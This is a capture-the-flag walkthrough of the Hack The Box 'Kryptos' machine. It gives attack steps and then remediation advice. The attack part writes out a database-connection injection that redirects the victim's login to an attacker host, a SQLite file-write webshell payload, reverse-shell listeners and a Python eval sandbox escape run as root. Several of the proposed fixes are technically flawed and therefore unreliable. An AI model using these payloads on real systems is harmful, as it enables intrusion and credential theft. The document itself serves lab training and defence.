---
title: "Kryptos HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T08:30:00Z
tags: ["insane-linux", "web", "sql-injection", "mysql", "cryptography", "rc4", "stream-cipher", "known-plaintext", "sqlite", "file-inclusion", "rng", "eval", "python", "bottle", "privilege-escalation"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Kryptos HTB machine featuring SQL injection database hijacking, RC4 stream cipher cryptanalysis, SQLite injection for file write, VimCrypt decryption, and Python eval exploitation through weak RNG"
---

# Kryptos HTB - Insane Linux Box Walkthrough

{{< youtube 4uCoI5YzOwk >}}

## Key Exploitation Steps and Techniques (Chronological Order)

The following is a chronological extraction of the key exploitation steps and techniques from the provided transcript. I've focused on the core actions, vulnerabilities exploited, and tools/techniques used, based on the walkthrough's narrative flow. Steps are numbered and include brief descriptions, techniques, and relevant tools/commands for clarity.

1. **Initial Reconnaissance (Port Scanning and Service Enumeration)**
   - Performed Nmap scan to identify open ports: SSH (22) and HTTP (80) on Ubuntu server running Apache and PHP.
   - Technique: Network scanning for service discovery.
   - Tools/Commands: `nmap -sC -sV -oA kryptos [TARGET-IP]`.

2. **Web Application Exploration (Login Page Analysis)**
   - Accessed the web root (HTTP/80), found a login form. Tested default creds (admin/admin, guest/guest) – failed.
   - Inspected source code, identified CSRF token in hidden input.
   - Ran directory brute-forcing in background.
   - Technique: Manual web inspection and fuzzing preparation.
   - Tools/Commands: Browser (Firefox/Burp Suite), Gobuster (`gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php -u http://[TARGET-IP] -o dirbust_port80_php`).

3. **Identifying SQL Injection in Login Parameters**
   - Used Burp Repeater to fuzz parameters (username, password, db). Found SQL injection in `db` parameter (e.g., `db=crypt'o` triggered PDO error 1044: access denied).
   - Noted requirement for valid CSRF token for injection to work.
   - Technique: Parameter fuzzing and error-based SQL injection.
   - Tools/Commands: Burp Suite Repeater.

4. **Redirecting Database Connection to Attacker's Machine**
   - Injected into `db` to rewrite connection string (e.g., `db=crypt';host=[ATTACKER-IP]`). Set up local MySQL listener.
   - Captured MySQL authentication attempt, obtained challenge-response hash.
   - Technique: SQL injection for connection hijacking and credential capture.
   - Tools/Commands: `nc -lvnp 3306`, Metasploit (`use auxiliary/server/capture/mysql; run`).

5. **Cracking Captured MySQL Hash**
   - Saved hash in Hashcat format (mode 11200). Cracked using rockyou wordlist, revealed password "kryptonite" for DB user.
   - Technique: Offline password cracking.
   - Tools/Commands: Hashcat (`hashcat -m 11200 hashes/kryptos.mysql /usr/share/wordlists/rockyou.txt`).

6. **Setting Up Local MySQL for Data Exfiltration**
   - Created local database "crypt" with user "dbuser@kryptonite", granted privileges. Used socat for port redirection.
   - Injected to connect to local DB, exfiltrated login query via Wireshark: `SELECT username, password FROM users WHERE username=? AND password=?`.
   - Technique: SQL injection for query exfiltration via hijacked connection.
   - Tools/Commands: MySQL CLI (`create database crypt; create user 'dbuser' identified by 'kryptonite'; grant all on crypt.* to 'dbuser'@'%';`), `socat TCP-LISTEN:3306,fork TCP:127.0.0.1:3306`, Wireshark/TCPdump.

7. **Bypassing Login via Local DB Manipulation**
   - Created "users" table in local DB, inserted dummy creds. Submitted login, authenticated session via shared PHPSESSID.
   - Technique: Session hijacking via manipulated DB response.
   - Tools/Commands: MySQL CLI (`use crypt; create table users(username varchar(32), password varchar(32)); insert into users values('please subscribe', md5('thank you'));`).

8. **Exploring Post-Authentication Pages (Encrypt/Decrypt)**
   - Accessed /encrypt.php: Supports AES-CBC and RC4 ciphers for URL content encryption (HTTP only). /decrypt.php under construction.
   - Technique: Post-auth web enumeration.

9. **Exploiting RC4 Stream Cipher Vulnerability**
   - Served file of 9001 'A's via local HTTP server, encrypted with RC4. Computed keystream via XOR (known plaintext attack).
   - Used keystream to decrypt encrypted content from localhost URLs (e.g., http://127.0.0.1/dev/).
   - Technique: Known plaintext attack on stream cipher (RC4).
   - Tools/Commands: Python HTTP server (`python -m SimpleHTTPServer 80`), Custom Python script for XOR decryption.

10. **Accessing Restricted Paths via Decryption**
    - Decrypted /dev/todo.php: Revealed SQLite test page, world-writable folder (/dev/), restricted PHP functions.
    - Decrypted source of /dev/sqlite_test_page.php via PHP filter (base64 encode).
    - Technique: Local file disclosure via cipher misuse and LFI (view parameter).
    - Tools/Commands: Custom decryption script, PHP filters (`php://filter/convert.base64-encode/resource=...`).

11. **SQL Injection in SQLite Test Page**
    - Injected into `book_id` parameter (e.g., `book_id=1; ATTACH DATABASE '/dev/test.php' AS x; CREATE TABLE x.pwn (dataz text); INSERT INTO x.pwn (dataz) VALUES ('<?php echo "please subscribe"; ?>');`).
    - Wrote PHP webshell to /dev/ (bypassing restrictions).
    - Technique: SQL injection for arbitrary file write (ATTACH DATABASE).
    - Tools/Commands: Burp Repeater, URL encoding for injection payload.

12. **Uploading and Executing Webshell**
    - Used injected file write to upload PHP reverse shell (via file_put_contents from remote URL).
    - Triggered shell, got www-data access.
    - Technique: File upload via SQL injection, reverse shell.
    - Tools/Commands: Chankro script for PHP shell generation, `nc -lvnp 9001`.

13. **User Enumeration and Credential Decryption**
    - Found /home/rijndael/: creds.old (rijndael:kryptos1) and encrypted creds.txt (VimCrypt~02).
    - Decrypted creds.txt using XOR attack on Blowfish CFB (static IV, known plaintext prefix). Revealed password "rijndael:Krypt0n1t3!".
    - Technique: Known plaintext attack on weak crypto implementation.
    - Tools/Commands: `dd` to strip header, Custom Python XOR script, `base64` for transfer.

14. **Privilege Escalation to User (SSH Login)**
    - SSH as rijndael using cracked password.
    - Technique: Credential reuse.
    - Tools/Commands: `ssh rijndael@[TARGET-IP]`.

15. **Discovering Internal Web Server**
    - Found Python Bottle app (/cryptos/cryptos.py) running on localhost:81.
    - Technique: Local enumeration.
    - Tools/Commands: `curl http://127.0.0.1:81`.

16. **Exploiting Weak RNG in Signing Key Generation**
    - Analyzed code: Weak random number generator (secure_rng) produces duplicates (~10% collision rate).
    - Brute-forced possible seeds from pre-generated list to find signing key.
    - Technique: Weak randomness exploitation for key recovery.
    - Tools/Commands: Custom Python script to generate/test RNG outputs.

17. **Bypassing Eval Restrictions for Code Execution**
    - Signed malicious expression bypassing built-in restrictions (e.g., `__class__.__base__.__subclasses__()[117].__init__.__globals__['os'].system`).
    - Executed reverse shell as root.
    - Technique: Python eval jailbreak via subclass manipulation.
    - Tools/Commands: Custom Python signing script, SSH port forwarding (`ssh -L 81:127.0.0.1:81 rijndael@[TARGET-IP]`), `nc -lvnp 9001`.

This sequence leads to full compromise (user and root flags). The walkthrough emphasizes crypto misconfigurations as the primary theme, with techniques like known plaintext attacks recurring across steps.

## Security Gaps and Remediation

Below is a detailed list of the security gaps identified in each service or system from the provided Kryptos Hack The Box walkthrough, along with recommended fixes to address these vulnerabilities. The gaps are organized by the affected service or system component, and each includes either a **source code fix** or a **configuration fix** to mitigate the issue. The fixes aim to prevent the exploitation steps outlined in the walkthrough.

---

### 1. Web Server (Apache on Port 80)
**Service/System**: Apache HTTP server running PHP-based web application.

#### Gap 1: SQL Injection in Login Form (`db` Parameter)
- **Description**: The `db` parameter in the login form is injectable, allowing attackers to manipulate the database connection string (e.g., `db=crypt';host=[ATTACKER-IP]`) to redirect connections to a malicious server and capture credentials.
- **Impact**: Attackers can exfiltrate database queries or capture authentication hashes.
- **Fix**:
  - **Source Code Fix**: Implement proper input sanitization and use prepared statements or parameterized queries for all user inputs. For example, in PHP:
    ```php
    $db = filter_input(INPUT_POST, 'db', FILTER_SANITIZE_STRING);
    $stmt = $pdo->prepare("SELECT * FROM users WHERE db = :db");
    $stmt->bindParam(':db', $db);
    $stmt->execute();
    ```
    Avoid directly concatenating user input into SQL queries.
  - **Configuration Fix**: Restrict database connection parameters to a predefined, server-side configuration file (e.g., `config.php`). Disable dynamic database selection in user input by hardcoding the database name:
    ```php
    $pdo = new PDO("mysql:host=localhost;dbname=crypt", "dbuser", "password");
    ```
    Additionally, configure the database server to only accept connections from trusted hosts (e.g., `localhost`).

#### Gap 2: Weak CSRF Token Implementation
- **Description**: The CSRF token is present but does not sufficiently prevent automated attacks, as it is easily retrievable and reusable in crafted requests.
- **Impact**: Attackers can automate requests (e.g., fuzzing, SQL injection) by fetching a new token for each submission.
- **Fix**:
  - **Source Code Fix**: Implement a robust CSRF token mechanism tied to the user session and validated server-side. For example, in PHP:
    ```php
    session_start();
    $token = bin2hex(random_bytes(32));
    $_SESSION['csrf_token'] = $token;
    // In form:
    echo '<input type="hidden" name="csrf_token" value="' . htmlspecialchars($token) . '">';
    // On submission:
    if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("Invalid CSRF token");
    }
    ```
    Ensure tokens are single-use and expire after a short period.
  - **Configuration Fix**: Use a web framework or library (e.g., Laravel, CodeIgniter) with built-in CSRF protection to simplify implementation.

#### Gap 3: Local File Inclusion (LFI) via `view` Parameter
- **Description**: The `/dev/index.php?view=` endpoint allows LFI via PHP filters (e.g., `php://filter/convert.base64-encode/resource=todo`), exposing source code.
- **Impact**: Attackers can read sensitive files, such as PHP source code, to uncover further vulnerabilities.
- **Fix**:
  - **Source Code Fix**: Validate and sanitize the `view` parameter to only allow specific, whitelisted values. For example:
    ```php
    $allowed_views = ['todo', 'index'];
    $view = filter_input(INPUT_GET, 'view', FILTER_SANITIZE_STRING);
    if (!in_array($view, $allowed_views)) {
        http_response_code(403);
        die("Invalid view parameter");
    }
    include "/var/www/html/dev/{$view}.php";
    ```
    Disable PHP filters for file inclusion:
    ```php
    if (strpos($view, 'php://') !== false) {
        die("Invalid file path");
    }
    ```
  - **Configuration Fix**: Configure PHP to disable dangerous functions and filters in `php.ini`:
    ```ini
    disable_functions = phpinfo, system, exec, passthru, shell_exec
    allow_url_include = Off
    ```
    Set `open_basedir` to restrict file access:
    ```ini
    open_basedir = /var/www/html
    ```

#### Gap 4: World-Writable Directory (`/dev/`)
- **Description**: The `/dev/` directory is world-writable, allowing attackers to write files (e.g., PHP webshells) via vulnerabilities like SQL injection.
- **Impact**: Attackers can achieve code execution by uploading malicious files.
- **Fix**:
  - **Configuration Fix**: Change directory permissions to restrict write access to the web server user only:
    ```bash
    chown www-data:www-data /var/www/html/dev
    chmod 750 /var/www/html/dev
    ```
    Regularly audit file system permissions to ensure no directories are world-writable:
    ```bash
    find /var/www -type d -perm -o+w -exec chmod o-w {} \;
    ```

---

### 2. MySQL Database
**Service/System**: MySQL database accessed via PHP application.

#### Gap 5: Exposed MySQL Credentials via Connection Hijacking
- **Description**: SQL injection allowed redirecting the database connection to an attacker's server, exposing the MySQL hash (cracked as "kryptonite").
- **Impact**: Attackers gain unauthorized access to the database or capture credentials.
- **Fix**:
  - **Configuration Fix**: Restrict MySQL to local connections only by binding to `localhost` in `my.cnf`:
    ```ini
    [mysqld]
    bind-address = 127.0.0.1
    ```
    Use a dedicated MySQL user with minimal privileges for the application:
    ```sql
    CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strongpassword';
    GRANT SELECT, INSERT ON crypt.* TO 'app_user'@'localhost';
    FLUSH PRIVILEGES;
    ```
  - **Source Code Fix**: As mentioned in Gap 1, avoid dynamic database names in connection strings and use prepared statements to prevent injection.

#### Gap 6: Weak Password for Database User
- **Description**: The database password ("kryptonite") was easily cracked using a common wordlist.
- **Impact**: Attackers can authenticate to the database with minimal effort.
- **Fix**:
  - **Configuration Fix**: Enforce strong, random passwords for database users. Generate using a secure method:
    ```bash
    openssl rand -base64 32
    ```
    Update the password:
    ```sql
    ALTER USER 'dbuser'@'%' IDENTIFIED BY 'new_strong_password';
    FLUSH PRIVILEGES;
    ```
  - **Source Code Fix**: Store credentials securely in a configuration file with restricted permissions:
    ```bash
    chmod 600 /var/www/html/config.php
    ```

---

### 3. File Encryption Service (/encrypt.php)
**Service/System**: Custom PHP file encryption endpoint using RC4 and AES-CBC.

#### Gap 7: RC4 Stream Cipher Misuse (Known Plaintext Attack)
- **Description**: RC4 encryption is vulnerable to known plaintext attacks due to its stream cipher nature, allowing attackers to compute the keystream and decrypt arbitrary content.
- **Impact**: Attackers can decrypt restricted pages (e.g., `/dev/` content) without authorization.
- **Fix**:
  - **Source Code Fix**: Replace RC4 with a secure encryption algorithm like AES-GCM, which provides authenticated encryption. Example in PHP:
    ```php
    $key = random_bytes(32); // Generate secure key
    $iv = random_bytes(12);  // Generate random IV
    $ciphertext = openssl_encrypt($data, 'aes-256-gcm', $key, 0, $iv, $tag);
    ```
    Ensure keys and IVs are randomly generated per session and never reused.
  - **Configuration Fix**: Remove RC4 as an option in the encryption service. Update the cipher dropdown to only include secure algorithms (e.g., AES-CBC, AES-GCM).

#### Gap 8: Lack of Input Validation on URLs
- **Description**: The encryption service accepts URLs without sufficient validation, allowing requests to internal resources (e.g., `http://127.0.0.1/dev/`).
- **Impact**: Attackers can access and encrypt/decrypt internal server content.
- **Fix**:
  - **Source Code Fix**: Validate URLs to ensure they are external and trusted. For example:
    ```php
    $url = filter_input(INPUT_POST, 'url', FILTER_VALIDATE_URL);
    if ($url === false || strpos($url, '127.0.0.1') !== false || strpos($url, 'localhost') !== false) {
        die("Invalid URL");
    }
    ```
  - **Configuration Fix**: Implement a Content Security Policy (CSP) to restrict requests to trusted domains:
    ```html
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' https://trusted-domain.com">
    ```

---

### 4. SQLite Test Page (/dev/sqlite_test_page.php)
**Service/System**: SQLite-based PHP page for querying books.

#### Gap 9: SQL Injection in `book_id` Parameter
- **Description**: The `book_id` parameter is not sanitized, allowing attackers to execute arbitrary SQLite commands (e.g., `ATTACH DATABASE` to write files).
- **Impact**: Attackers can write malicious PHP files to achieve code execution.
- **Fix**:
  - **Source Code Fix**: Use prepared statements for SQLite queries:
    ```php
    $db = new SQLite3('books.db');
    $book_id = filter_input(INPUT_GET, 'book_id', FILTER_VALIDATE_INT);
    if ($book_id === false) {
        die("Invalid book ID");
    }
    $stmt = $db->prepare('SELECT * FROM books WHERE id = :id');
    $stmt->bindValue(':id', $book_id, SQLITE3_INTEGER);
    $result = $stmt->execute();
    ```
  - **Configuration Fix**: Restrict SQLite to read-only operations for the web application user:
    ```bash
    chmod 644 /var/www/html/dev/books.db
    ```

#### Gap 10: Unsafe Use of `exec` vs. `query`
- **Description**: The page uses `exec` for queries when `no_results` is set, allowing arbitrary command execution.
- **Impact**: Attackers can execute unintended SQLite commands via injection.
- **Fix**:
  - **Source Code Fix**: Replace `exec` with `query` for all SELECT operations and ensure proper sanitization:
    ```php
    if (isset($_GET['no_results'])) {
        $result = $db->query("SELECT * FROM books WHERE id = " . (int)$_GET['book_id']);
    } else {
        $stmt = $db->prepare('SELECT * FROM books WHERE id = :id');
        $stmt->bindValue(':id', $_GET['book_id'], SQLITE3_INTEGER);
        $result = $stmt->execute();
    }
    ```

---

### 5. File System
**Service/System**: Server file system.

#### Gap 11: Weak File Permissions (creds.txt, creds.old)
- **Description**: Sensitive files (`creds.txt`, `creds.old`) in `/home/rijndael/` are world-readable, exposing credentials.
- **Impact**: Attackers with limited access can read sensitive data.
- **Fix**:
  - **Configuration Fix**: Restrict file permissions to the owner:
    ```bash
    chown rijndael:rijndael /home/rijndael/creds*
    chmod 600 /home/rijndael/creds*
    ```

#### Gap 12: VimCrypt Misuse (Static IV in Blowfish CFB)
- **Description**: `creds.txt` is encrypted with VimCrypt~02 (Blowfish CFB) using a static IV, vulnerable to known plaintext attacks.
- **Impact**: Attackers can decrypt the file using XOR with known plaintext.
- **Fix**:
  - **Source Code Fix**: Use a secure encryption library (e.g., OpenSSL) with random IVs and strong algorithms:
    ```php
    $key = random_bytes(32);
    $iv = random_bytes(16);
    $ciphertext = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
    ```
    Avoid custom or weak encryption like VimCrypt.
  - **Configuration Fix**: Store sensitive data in a secure vault (e.g., HashiCorp Vault) or encrypted database instead of plaintext files.

---

### 6. Internal Web Server (Bottle on Port 81)
**Service/System**: Python Bottle micro-framework running on localhost:81.

#### Gap 13: Weak Random Number Generator (RNG)
- **Description**: The `secure_rng` function produces predictable outputs (~10% collision rate), allowing attackers to brute-force the signing key.
- **Impact**: Attackers can forge valid signatures for eval expressions.
- **Fix**:
  - **Source Code Fix**: Use a cryptographically secure RNG, such as `secrets` module in Python:
    ```python
    import secrets
    def secure_rng(seed):
        return secrets.randbits(128)
    ```
    Replace `random.getrandbits` with `secrets.randbits` for key generation.
  - **Configuration Fix**: Ensure the application regenerates signing keys per session or request, not once per server start.

#### Gap 14: Unsafe Use of `eval`
- **Description**: The `/eval` endpoint uses `eval` with insufficient input validation, allowing code execution via subclass manipulation (e.g., `__class__.__base__.__subclasses__()`).
- **Impact**: Attackers can execute arbitrary Python code, leading to root access.
- **Fix**:
  - **Source Code Fix**: Remove `eval` entirely and use a safer alternative (e.g., a predefined set of allowed operations). If dynamic evaluation is required, use a sandboxed environment like `restrictedpython`:
    ```python
    from restrictedpython import compile_restricted
    code = compile_restricted(user_input, '<string>', 'eval')
    result = eval(code, {"__builtins__": {}}, {})
    ```
    Validate and restrict inputs to prevent access to dangerous attributes:
    ```python
    if any(dangerous in user_input for dangerous in ['__class__', '__subclasses__', 'os', 'system']):
        raise ValueError("Invalid expression")
    ```
  - **Configuration Fix**: Run the Bottle server with minimal privileges (non-root user) and in a containerized environment (e.g., Docker) to limit impact:
    ```bash
    useradd -r bottle_user
    chown bottle_user:bottle_user /path/to/cryptos.py
    docker run --user bottle_user -p 127.0.0.1:81:81 cryptos_app
    ```

#### Gap 15: Exposed Internal Service
- **Description**: The Bottle server runs on `localhost:81`, but port forwarding via SSH allows external access.
- **Impact**: Attackers with user access can interact with the internal service.
- **Fix**:
  - **Configuration Fix**: Explicitly bind the Bottle server to `127.0.0.1` and disable remote port forwarding in SSH configuration (`/etc/ssh/sshd_config`):
    ```ini
    AllowTcpForwarding no
    ```
    Reload SSH service:
    ```bash
    systemctl reload sshd
    ```

---

### 7. SSH Service
**Service/System**: SSH server on port 22.

#### Gap 16: Weak User Password
- **Description**: The user `rijndael` has a weak password ("Krypt0n1t3!") that was derived from predictable encryption.
- **Impact**: Attackers can brute-force or guess credentials for SSH access.
- **Fix**:
  - **Configuration Fix**: Enforce strong password policies via PAM:
    ```bash
    apt install libpam-pwquality
    ```
    Edit `/etc/security/pwquality.conf`:
    ```ini
    minlen = 12
    minclass = 4
    ```
    Disable password authentication and enforce key-based authentication in `/etc/ssh/sshd_config`:
    ```ini
    PasswordAuthentication no
    PubkeyAuthentication yes
    ```
    Reload SSH:
    ```bash
    systemctl reload sshd
    ```

---

### General Recommendations
- **Patch Management**: Ensure all software (Apache, PHP, MySQL, SQLite, Python, Bottle) is updated to the latest stable versions to mitigate known vulnerabilities.
- **Logging and Monitoring**: Enable comprehensive logging (e.g., Apache access/error logs, MySQL query logs) and monitor for suspicious activity using tools like Fail2Ban or a SIEM.
- **Principle of Least Privilege**: Run services with minimal permissions (e.g., non-root users, restricted DB privileges).
- **Network Segmentation**: Use a firewall (e.g., `ufw`) to restrict access to internal services (e.g., block port 81 externally):
  ```bash
  ufw allow from 127.0.0.1 to any port 81
  ufw deny 81
  ```

These fixes address the specific vulnerabilities exploited in the walkthrough, ensuring the system is hardened against similar attacks. Each gap is tied to a specific exploitation step, and the proposed fixes aim to prevent those techniques from succeeding.

## Conclusion

Kryptos is an excellent machine that demonstrates the dangers of cryptographic misimplementations and the interconnected nature of web application vulnerabilities. It requires expertise in:
- Advanced SQL injection techniques and database connection manipulation
- Cryptographic analysis including stream cipher vulnerabilities and known plaintext attacks
- Web application security testing and local file inclusion exploitation
- SQLite injection for arbitrary file write capabilities
- Weak random number generation exploitation and signature forgery
- Python eval sandbox escape techniques

The machine emphasizes the critical importance of proper cryptographic implementation, secure coding practices, input validation, and the principle of least privilege across all system components.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*